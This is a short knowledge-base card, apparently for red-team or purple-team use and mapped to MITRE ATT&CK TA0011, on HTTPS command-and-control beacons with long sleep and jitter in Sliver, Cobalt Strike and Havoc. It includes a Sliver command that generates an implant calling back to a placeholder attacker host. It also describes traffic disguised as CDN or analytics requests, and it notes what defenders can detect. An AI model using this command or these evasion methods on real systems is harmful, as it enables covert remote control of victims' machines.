---
id: https-beacon-sliver
title: HTTPS beacon with long sleep + jitter (Sliver / Cobalt / Havoc)
section: Command & Control
phase: Command & Control
attack:
  tactic: TA0011
  techniques: [T1071.001]
platform: [windows, network]
source: MITRE ATT&CK TA0011; Sliver / Cobalt Strike / Havoc C2 tradecraft
pair: https-beacon-jitter
---

The default C2 posture: an implant that phones home over HTTPS to a redirector so
the traffic rides port 443 and TLS hides the payload. A long sleep with high jitter
(callbacks minutes-to-hours apart, randomized ±30%) breaks the fixed-interval
periodicity that beacon-hunting keys on, and a malleable profile shapes the URIs,
headers, and user-agent to look like ordinary web traffic. The blue tell is the
statistical regularity that survives the jitter, not any single request.

```sh
# Sliver: HTTPS beacon calling back to the redirector, hour sleep, 30% jitter
sliver > generate beacon --http {{lhost}}:{{port}} --seconds 3600 --jitter 1800 --save implant.exe
# Cobalt Strike / Havoc: same shape driven by a malleable C2 profile that
# masquerades the URIs + User-Agent as CDN / analytics traffic
```
